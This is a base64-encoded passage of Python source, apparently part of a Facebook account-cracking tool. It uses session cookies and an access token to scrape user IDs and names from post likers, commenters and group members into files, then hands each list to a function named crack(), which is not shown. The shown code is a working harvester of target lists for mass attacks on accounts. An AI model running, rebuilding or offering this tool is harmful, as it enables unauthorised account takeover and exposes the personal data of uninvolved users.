CgpLnNwbGl0bGluZXMoKSkpLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICB0cnk6IA0KICAgICAgICBmb3IgX2lzaV8gaW4gX3Nlc19wYXJfLmZpbmRfYWxsKCdoMycpOg0KICAgICAgICAgICAgZm9yIF9pZF8gaW4gX2lzaV8uZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBpZiAicHJvZmlsZS5waHAiIGluIF9pZF8uZ2V0KCJocmVmIik6X2FfID0gX2lkXy5nZXQoImhyZWYiKS5zcGxpdCgnPScpWzFdO19faWRfXyA9IF9pZF8udGV4dDtfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ2ErJykud3JpdGUoX2FfKyfigKInK19faWRfXysnXG4nKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOl9hXyA9IF9pZF8uZ2V0KCJocmVmIikuc3BsaXQoJy8nKVsxXTtfX2lkX18gPSBfaWRfLnRleHQ7X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCdhKycpLndyaXRlKF9hXysn4oCiJytfX2lkX18rJ1xuJykNCiAgICAgICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgZm9yIF9sYW5qdXRfIGluIF9zZXNfcGFyXy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCiAgICAgICAgICAgIGlmICJTZWUgbW9yZSIgaW4gX2xhbmp1dF8udGV4dDoNCiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICB0cnk6c2NyYXBlX2xpa2VycyhfYXppbXZhdV8sImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iK19sYW5qdXRfLmdldCgiaHJlZiIpLF9maWxlXyk7YnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnByaW50KCclcyVzJyUoTSxlKSkNCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhfZmlsZV8pDQoNCg0KZGVmIG1haW5fa29tZW4oX2F6aW12YXVfKToNCiAgICBfcXVlcnlfID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0VOVEVSIFBPU1QgSUQgOiAnJShILFAsSCxLKSk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc1BSRVNTIENUUkwrQyBUTyBTVE9QIERVTVAiJShILFAsSCxLKSk7X2ZpbGVfID0gX3F1ZXJ5XysnLmpzb24nDQogICAgdHJ5Om9zLnJlbW92ZShfcXVlcnlfKycuanNvbicpDQogICAgZXhjZXB0OnBhc3MNCiAgICBfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ3cnKTtfdXJsXyA9ICgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLycrX3F1ZXJ5Xyk7c2NyYXBlX2tvbWVuKF9hemltdmF1XyxfdXJsXyxfZmlsZV8pDQogICAgaWYgbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkgPT0gMDpwcmludCgnXG4lcyBbJXMhJXNdICVzUE9TVCBOT1QgRk9VTkQnJShNLFAsTSxQKSk7X2NpY2lfY2ljaV8oKQ0KICAgIHByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCIlKEgsUCxILEssbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soX2ZpbGVfKQ0KZGVmIHNjcmFwZV9rb21lbihfYXppbXZhdV8sX3VybF8sX2ZpbGVfKToNCiAgICBfc2VzXyA9IF9yZXFfc2VzXztfdXJsX2xvYWRfID0gX3Nlc18uZ2V0KF91cmxfLGNvb2tpZXM9X2F6aW12YXVfLGhlYWRlcnM9aGVhZGVyX2dydXApLnRleHQuZW5jb2RlKCJ1dGYtOCIpO19zZXNfcGFyXyA9IHBhcihfdXJsX2xvYWRfLCdodG1sLnBhcnNlcicpO3ByaW50KCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSwgZW5kPScgJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgdHJ5OiANCiAgICAgICAgZm9yIF9pc2lfIGluIF9zZXNfcGFyXy5maW5kX2FsbCgnaDMnKToNCiAgICAgICAgICAgIGZvciBfaWRfIGluIF9pc2lfLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwIiBpbiBfaWRfLmdldCgiaHJlZiIpOl9hXz0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCJwcm9maWxlXC5waHBcP2lkPSguKj8pJiIsX2lkXy5nZXQoImhyZWYiKSkpO19faWRfXyA9IF9pZF8udGV4dDtfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ2ErJykud3JpdGUoc3RyKF9hXykuc3BsaXQoJyYnKVswXSsn4oCiJytfX2lkX18rJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgZWxzZTpfYV89IiIuam9pbihiczQucmUuZmluZGFsbCgiLyguKj8pXD8iLF9pZF8uZ2V0KCJocmVmIikpKTtfX2lkX18gPSBfaWRfLnRleHQ7X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCdhKycpLndyaXRlKHN0cihfYV8pLnNwbGl0KCc/JylbMF0rJ+KAoicrX19pZF9fKydcbicpDQogICAgICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgIGZvciBfbGFuanV0XyBpbiBfc2VzX3Bhcl8uZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICBpZiAiVmlldyBtb3JlIGNvbW1lbnRz4oCmIiBpbiBfbGFuanV0Xy50ZXh0Og0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIHRyeTpzY3JhcGVfa29tZW4oX2F6aW12YXVfLCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vIitfbGFuanV0Xy5nZXQoImhyZWYiKSxfZmlsZV8pO2JyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludCgnJXMlcyclKE0sZSkpDQogICAgICAgICAgICBlbGlmICJWaWV3IHByZXZpb3VzIGNvbW1lbnRz4oCmIiBpbiBfbGFuanV0Xy50ZXh0Og0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIHRyeTpzY3JhcGVfbGlrZXJzKF9hemltdmF1XywiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIrX2xhbmp1dF8uZ2V0KCJocmVmIiksX2ZpbGVfKTticmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cHJpbnQoJyVzJXMnJShNLGUpKQ0KICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDpwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCg0KDQpjbGFzcyBkdW1wX2dydXA6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsX2F6aW12YXVfLF9jaWNpXyk6DQogICAgICAgIHNlbGYuZ2xpc3Q9W107c2VsZi5fZ3J1cF89W107c2VsZi5pZD0nX19hemltdmF1X18uanNvbic7c2VsZi50b2tlbj1fY2ljaV87c2VsZi5jb29raWVzPV9hemltdmF1XztzZWxmLmhlYWRlciA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9lbl9VUztGQkFWLzE3My4wLjAuMTAuMTE4O10ifTtzZWxmLm1haW5fZ3JvdXAoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vZ3JvdXBzLz9zZWVtb3JlIikNCiAgICBkZWYgbWFpbl9ncm91cChzZWxmLCB1cmxfZGV2KToNCiAgICAgICAgYnM9YnM0LkJlYXV0aWZ1bFNvdXAoX3JlcV9nZXRfKHVybF9kZXYsY29va2llcz1zZWxmLmNvb2tpZXMsaGVhZGVycz1zZWxmLmhlYWRlcikudGV4dCwiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmb3IgX2NpY2lfIGluIGJzLmZpbmRfYWxsKCJhIixocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgIi9ncm91cHMvIiBpbiBfY2ljaV8uZ2V0KCJocmVmIik6DQogICAgICAgICAgICAgICAgaWYgImNhdGVnb3J5IiBpbiBfY2ljaV8uZ2V0KCJocmVmIikgb3IgImNyZWF0ZSIgaW4gX2NpY2lfLmdldCgiaHJlZiIpOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxzZTpzZWxmLmdsaXN0LmFwcGVuZCh7ImlkIjoiIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvZ3JvdXBzLyguKj8pXD8iLF9jaWNpXy5nZXQoImhyZWYiKSkpLCJuYW1lIjpfY2ljaV8udGV4dH0pDQogICAgICAgIGlmIGxlbihzZWxmLmdsaXN0KSAhPTA6DQogICAgICAgICAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzWU9VIEpPSU4gJXMlcyVzIEdST1VQIiUoSCxQLEgsSyxPLGxlbihzZWxmLmdsaXN0KSxQKSk7cHJpbnQoJyVzIFslczElc10gJXNTRUFSQ0ggQUxMIEdST1VQUyBKT0lOJyUoSCxQLEgsSykpO3ByaW50KCclcyBbJXMyJXNdICVzU0VBUkNIIEdST1VQUyBCWSBOQU1FJyUoSCxQLEgsSykpO3ByaW50KCclcyBbJXMzJXNdICVzU0VBUkNIIEdST1VQUyBCWSBJRCclKEgsUCxILEspKQ0KICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICBjPV9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNDSE9PU0UgOiAnJShILFAsSCxLKSk7cHJpbnQoJyVzICclKE8pKQ0KICAgICAgICAgICAgICAgIGlmIGM9PSIiOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxpZiBjPT0iMSI6c2VsZi5zYXlhKCkNCiAgICAgICAgICAgICAgICBlbGlmIGM9PSIyIjpzZWxmLnNlYXJjaCgpDQogICAgICAgICAgICAgICAgZWxpZiBjPT0iMyI6c2VsZi5tYW51YWwoKQ0KICAgICAgICAgICAgICAgIGVsc2U6amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgZWxzZTpwcmludCgiJXMgWyVz4oCiJXNdICVzWU9VIERPTidUIEpPSU4gQU5ZIEdST1VQIiUoSCxQLEgsSykpO3NlbGYubWFudWFsKCkNCiAgICBkZWYgc2F5YShzZWxmKToNCiAgICAgICAgc2VsZi5mbD0oc2VsZi5pZCkNCiAgICAgICAgdHJ5Om9zLnJlbW92ZShzZWxmLmZsKQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzUFJFU1MgQ1RSTCtDIFRPIFNUT1AgRFVNUCIlKEgsUCxILEspKQ0KICAgICAgICB0cnk6IA0KICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2dyb3Vwcz9hY2Nlc3NfdG9rZW49e30iLmZvcm1hdChzZWxmLnRva2VuKQ0KICAgICAgICAgICAgd2l0aCBfcmVxX3Nlc18gYXMgc2VzXzoNCiAgICAgICAgICAgICAgICBkYXRhID0gc2VzXy5nZXQodXJsKS5qc29uKCkNCiAgICAgICAgICAgICAgICBmb3IgX2F6aW12YXVfIGluIGRhdGFbImRhdGEiXToNCiAgICAgICAgICAgICAgICAgICAgdHJ5OnNlbGYuX2dydXBfLmFwcGVuZChfYXppbXZhdV9bImlkIl0pDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICBmb3IgX2NpY2lfIGluIHNlbGYuX2dydXBfOg0KICAgICAgICAgICAgICAgIHRyeTpzZWxmLnVybF9ncnVwID0gKCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vYnJvd3NlL2dyb3VwL21lbWJlcnMvP2lkPSVzIiUoX2NpY2lfKSk7c2VsZi5leGVjX2dydXBfc2F5YSgpO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBGUk9NIE1ZIEdST1VQIiUoSCxQLEgsUCxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIEZST00gTVkgR1JPVVAiJShILFAsSCxQLGxlbihfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhzZWxmLmZsKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgX2Vycm9yXzpwcmludCgnXG4lcyBbJXMhJXNdICVzRVJST1IgSU4gU0VDVElPTiA6ICVzJyUoTSxQLE0sUCxfZXJyb3JfKSk7X2NpY2lfY2ljaV8oKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOmphbGFuKCclcyBbJXMhJXNdICVzQ09PS0lFIElOVkFMSUQnJShNLFAsTSxQKSk7bWVudSgpDQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjpqYWxhbignJXMgWyVzISVzXSAlc0NPTk5FQ1RJT04gUFJPQkxFTSclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OnByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBGUk9NIE1ZIEdST1VQIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfZXJyb3JfOnByaW50KCdcbiVzIFslcyElc10gJXNFcnJvciBEaSBCYWdpYW4gOiAlcyclKE0sUCxNLFAsX2Vycm9yXykpO19jaWNpX2NpY2lfKCkNCiAgICBkZWYgZXhlY19ncnVwX3NheWEoc2VsZik6DQogICAgICAgIGdsb2JhbCBjb3VudA0KICAgICAgICB3aXRoIF9yZXFfc2VzXyBhcyBzZXNfOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGRhdGEgPSBzZXNfLmdldChzZWxmLnVybF9ncnVwLCBjb29raWVzPXNlbGYuY29va2llcywgaGVhZGVycz1zZWxmLmhlYWRlcikuY29udGVudDtzb3BfZGV2ID0gcGFyKGRhdGEsICJodG1sLnBhcnNlciIpO21lbWJlcnMgPSBzb3BfZGV2LmZpbmQoImRpdiIsIGlkPSJvYmplY3RzX2NvbnRhaW5lciIpDQogICAgICAgICAgICAgICAgZm9yIGRldiBpbiBtZW1iZXJzLmZpbmRfYWxsKCJ0YWJsZSIpOg0KICAgICAgICAgICAgICAgICAgICB1c2VyXyA9IGRldlsiaWQiXS5yZXBsYWNlKCJtZW1iZXJfIiwgIiIpO25hbWFfID0gcmUuZmluZGFsbCgnPGltZyBhbHQ9IiguKiksIHByb2ZpbGUgcGljdHVyZSInLCBzdHIoZGV2KSlbMF0NCiAgICAgICAgICAgICAgICAgICAgdHJ5Ol9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwsJ2ErJykud3JpdGUoc3RyKHVzZXJfKSsi4oCiIitzdHIobmFtYV8pKyJcbiIpLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICBwcmludCgiXHIlcyBbJXPigKIlc10gJXNUQUtJTkcgJXMlcyBJRCIlKEgsUCxILEssSCxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSkpLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgICAgICBpZiAiU2VlIG1vcmUiIGluIHN0cihzb3BfZGV2KTp1cmwgPSBzb3BfZGV2LmZpbmQoImEiLCBzdHJpbmc9IlNlZSBtb3JlIilbImhyZWYiXTt1cmxfZ3J1cCA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK3VybDtzZWxmLmV4ZWNfZ3J1cF9zYXlhKCkNCiAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDpwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQgRGFyaSBHcnVwIFNheWEiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhzZWxmLmZsKQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfZXJyb3JfOnByaW50KCdcbiVzIFslcyElc10gJXNFcnJvciBEaSBCYWdpYW4gOiAlcyclKE0sUCxNLFAsX2Vycm9yXykpO19jaWNpX2NpY2lfKCkNCiAgICBkZWYgbWFudWFsKHNlbGYpOg0KICAgICAgICBpZD1fY2ljaV9hemltdmF1XygiJXMgWyVz4oCiJXNdICVzRU5URVIgR1JPVVAgSUQgOiAiJShILFAsSCxLKSkNCiAgICAgICAgaWYgaWQ9PSIiOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7bWVudSgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByPWJzNC5CZWF1dGlmdWxTb3VwKF9yZXFfZ2V0XygiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9ncm91cHMvIitpZCxoZWFkZXJzPWhlYWRlcl9ncnVwLGNvb2tpZXM9c2VsZi5jb29raWVzKS50ZXh0LCJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBpZiAibm8gY29udGVudCIgaW4gci5maW5kKCJ0aXRsZSIpLnRleHQubG93ZXIoKTpqYWxhbignJXMgWyVzISVzXSAlc1BSSVZBVEUgR1JPVVAgLyBXUk9ORyBJRCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgc2VsZi5saXN0ZWQ9eyJpZCI6aWQsIm5hbWUiOnIuZmluZCgidGl0bGUiKS50ZXh0fTtzZWxmLmYoaWQpO3ByaW50KCclcyAnJShPKSk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc05BTUUgOiAlcyIlKEgsUCxILEssc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTt4ZCA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNEdW1wIElEL1VzZXJuYW1lPyBbaS91XSA6ICclKEgsUCxILEspKTtwcmludCgiJXMgWyVz4oCiJXNdICVzUFJFU1MgQ1RSTCtDIFRPIFNUT1AgRFVNUCIlKEgsUCxILEspKQ0KICAgICAgICAgICAgICAgIGlmIHhkIGluIFsnJ106amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgICAgICAgICBlbGlmIHhkIGluIFsnaScsJ0knLCcxJ106DQogICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmR1bXBfaWQoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vZ3JvdXBzLyIraWQpO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBEYXJpICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OnByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBEYXJpICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfZXJyb3JfOnByaW50KCdcbiVzIFslcyElc10gJXNFcnJvciBEaSBCYWdpYW4gOiAlcyclKE0sUCxNLFAsX2Vycm9yXykpO19jaWNpX2NpY2lfKCkNCiAgICAgICAgICAgICAgICBlbGlmIHhkIGluIFsndScsJ1UnLCcyJ106DQogICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmR1bXBfdXNlcm5hbWUoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vZ3JvdXBzLyIraWQpO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBEYXJpICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OnByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBGUk9NICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfZXJyb3JfOnByaW50KCdcbiVzIFslcyElc10gJXNFUlJPUiBJTiBTRUNUSU9OIDogJXMnJShNLFAsTSxNLF9lcnJvcl8pKTtfY2ljaV9jaWNpXygpDQogICAgICAgICAgICAgICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sTSkpO21lbnUoKSAgICANCiAgICBkZWYgc2VhcmNoKHNlbGYpOg0KICAgICAgICB3aGl0ZWxpc3Q9W107cT1fY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzTkFNRSA6ICclKEgsUCxILEspKS5sb3dlcigpDQogICAgICAgIGlmIHE9PScnOnNlbGYuc2VhcmNoKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGZvciBlLGkgaW4gZW51bWVyYXRlKHNlbGYuZ2xpc3QpOg0KICAgICAgICAgICAgICAgIGlmIHEgaW4gaS5nZXQoIm5hbWUiKS5sb3dlcigpOndoaXRlbGlzdC5hcHBlbmQoaSk7cHJpbnQoJyVzIFslcyVzJXNdICVzJXMnJShPLFAsbGVuKHdoaXRlbGlzdCksTyxQLGkuZ2V0KCJuYW1lIikucmVwbGFjZShxLCIlcyIlKHEpKSkpDQogICAgICAgICAgICBpZiBsZW4od2hpdGVsaXN0KT09MDpqYWxhbignJXMgWyVzISVzXSAlc1BSSVZBVEUgR1JPVVAgT1IgV1JPTkcgSUQnJShNLFAsTSxQKSk7bWVudSgpDQogICAgICAgICAgICBlbHNlOnNlbGYuY2hvaWNlKHdoaXRlbGlzdCxxKQ0KICAgIGRlZiBjaG9pY2Uoc2VsZiwgd2hpdGVsaXN0LHEpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBzZWxmLmxpc3RlZD13aGl0ZWxpc3RbaW50KF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNDSE9PU0UgOiAnJShILFAsSCxLKSkpLWludCgxKV07c2VsZi5mKHEpO3ByaW50KCclcyAnJShPKSk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc05BTUUgOiAlcyIlKEgsUCxILEssc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTt4ZCA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNEVU1QL1VTRVJOQU1FPyAlc1slc2klcy8lc3Ulc10gOiAnJShILFAsSCxLLFosTSxaLEgsWikpO3ByaW50KCIlcyBbJXPigKIlc10gJXNQUkVTUyBDVFJMK0MgVE8gU1RPUCBEVU1QIiUoSCxQLEgsSykpDQogICAgICAgICAgICBpZiB4ZCBpbiBbJyddOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7bWVudSgpDQogICAgICAgICAgICBlbGlmIHhkIGluIFsnaScsJ0knLCcxJ106DQogICAgICAgICAgICAgICAgdHJ5OnNlbGYuZHVtcF9pZCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9ncm91cHMvIitzZWxmLmxpc3RlZC5nZXQoImlkIikpO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBEYXJpICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIEZST00gJXMiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSxzZWxmLmxpc3RlZC5nZXQoIm5hbWUiKSkpO3JldHVybiBjcmFjayhzZWxmLmZsKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgX2Vycm9yXzpwcmludCgnXG4lcyBbJXMhJXNdICVzRVJST1IgSU4gU0VDVElPTiA6ICVzJyUoTSxQLE0sUCxfZXJyb3JfKSk7X2NpY2lfY2ljaV8oKQ0KICAgICAgICAgICAgZWxpZiB4ZCBpbiBbJ3UnLCdVJywnMiddOg0KICAgICAgICAgICAgICAgIHRyeTpzZWxmLmR1bXBfdXNlcm5hbWUoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vZ3JvdXBzLyIrc2VsZi5saXN0ZWQuZ2V0KCJpZCIpKTtwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQgRGFyaSAlcyIlKEgsUCxILEssbGVuKF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpLHNlbGYubGlzdGVkLmdldCgibmFtZSIpKSk7cmV0dXJuIGNyYWNrKHNlbGYuZmwpDQogICAgICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OnByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBEYXJpICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIF9lcnJvcl86cHJpbnQoJ1xuJXMgWyVzISVzXSA